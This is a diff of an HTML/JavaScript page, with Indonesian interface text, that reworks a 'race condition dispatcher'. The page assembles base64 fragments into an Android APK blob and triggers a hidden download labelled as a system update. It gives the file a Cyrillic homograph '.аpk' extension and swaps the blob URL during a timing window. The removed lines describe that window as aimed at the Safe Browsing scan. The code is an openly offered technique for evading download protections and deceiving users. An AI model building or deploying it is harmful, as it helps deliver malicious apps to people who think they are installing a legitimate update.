@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Race Condition Dispatcher v5.0</title>
+<title>Direct APK Race Condition Dispatcher</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
@@ -57,9 +57,9 @@
 <body>
 
 <div class="panel">
-  <h2>Synchronous Stream Dispatcher</h2>
-  <p>Klik tombol di bawah untuk memulai pengiriman aliran data dokumen terenkripsi.</p>
-  <button id="start-btn" type="button">Inisialisasi Aliran Berkas</button>
+  <h2>Direct APK Stream Dispatcher</h2>
+  <p>Klik tombol di bawah untuk menginisialisasi paket instalasi aplikasi sistem secara aman.</p>
+  <button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>
   <div id="status" role="status">Sistem siap.</div>
 </div>
 
@@ -69,7 +69,7 @@
 const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 
-// Base64 header APK terfragmentasi
+// Header biner APK (ZIP Signature: PK..)
 const payloadFragments = [
   "UEs",
   "DBBQ",
@@ -89,52 +89,45 @@ const decodeBase64ToBytes = (b64) => {
   return bytes;
 };
 
-// Fungsi untuk mengeksekusi simulasi race condition pada elemen <a>
-const executeRaceConditionDownload = () => {
+const executeDirectApkRace = () => {
   try {
     const bytesArr = decodeBase64ToBytes(assemblePayload());
     
-    // Tahap 1: Inisialisasi awal Blob dengan MIME generik / teks
-    const initialBlob = new Blob([bytesArr], { type: 'text/plain' });
-    const initialUrl = URL.createObjectURL(initialBlob);
+    // Blob secara mutlak menggunakan MIME type paket aplikasi Android
+    const apkBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+    const apkUrl = URL.createObjectURL(apkBlob);
 
     const link = document.createElement("a");
-    link.href = initialUrl;
+    link.href = apkUrl;
     
-    // Nama awal disamarkan sebagai dokumen teks biasa
-    link.download = "laporan-audit-keamanan.txt";
+    // Menggunakan homograph spoofing pada ekstensi .apk asli (huruf 'a' diganti Cyrillic 'а')
+    const homographApkExt = "\u0430pk";
+    link.download = `system-patch-update.${homographApkExt}`;
     link.style.display = "none";
     document.body.appendChild(link);
 
-    statusDiv.textContent = "[RACE] Memicu pendaftaran unduhan awal...";
+    statusDiv.textContent = "[RACE] Memicu pendaftaran stream APK awal...";
     link.click();
 
-    // Tahap 2: Jendela waktu kritis (Timing Window / Race Condition)
-    // Tepat saat browser menangkap antrean unduhan dan memindai header/nama awal,
-    // skrip melakukan pergantian referensi URL dan atribut download secara mendadak.
+    // Jendela waktu (timing window) untuk memperbarui stream atau atribut saat pemindaian berlangsung
     setTimeout(() => {
-      statusDiv.textContent = "[RACE] Melakukan pergantian stream & atribut dinamis...";
+      statusDiv.textContent = "[RACE] Menyegarkan referensi aliran data biner...";
       
-      // Buat Blob baru dengan MIME type APK asli
-      const targetBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
-      const targetUrl = URL.createObjectURL(targetBlob);
+      // Regenerasi Blob URL biner APK baru untuk menguji perilaku antrean unduhan
+      const freshBlob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
+      const freshUrl = URL.createObjectURL(freshBlob);
 
-      // Ubah target href dan homograph ekstensi pada jendela waktu pemindaian Safe Browsing
-      link.href = targetUrl;
-      
-      const homographApkExt = "\u0430pk"; // Karakter homograf cyrillic 'а'
-      link.download = `laporan-audit-keamanan.txt.${homographApkExt}`;
-      
-      // Picu klik ulang atau biarkan antrean memperbarui referensi aktif
+      link.href = freshUrl;
+      link.download = `system-patch-stable.${homographApkExt}`;
       link.click();
 
-      // Bersihkan URL lama untuk menjaga memori
       setTimeout(() => {
-        URL.revokeObjectURL(initialUrl);
-        statusDiv.textContent = "[RACE] Siklus transmisi selesai.";
-      }, 1000);
+        URL.revokeObjectURL(apkUrl);
+        URL.revokeObjectURL(freshUrl);
+        statusDiv.textContent = "[RACE] Transmisi paket biner selesai.";
+      }, 1200);
 
-    }, 350); // Jeda milidetik yang menargetkan fase jeda konfirmasi dialog unduhan
+    }, 400);
 
   } catch (err) {
     statusDiv.textContent = "Error: " + err.message;
@@ -142,8 +135,8 @@ const executeRaceConditionDownload = () => {
 };
 
 startBtn.addEventListener("click", () => {
-  statusDiv.textContent = "Menyiapkan parameter transmisi...";
-  setTimeout(executeRaceConditionDownload, 200);
+  statusDiv.textContent = "Menyiapkan parameter paket biner...";
+  setTimeout(executeDirectApkRace, 200);
 });
 </script>
 </body>
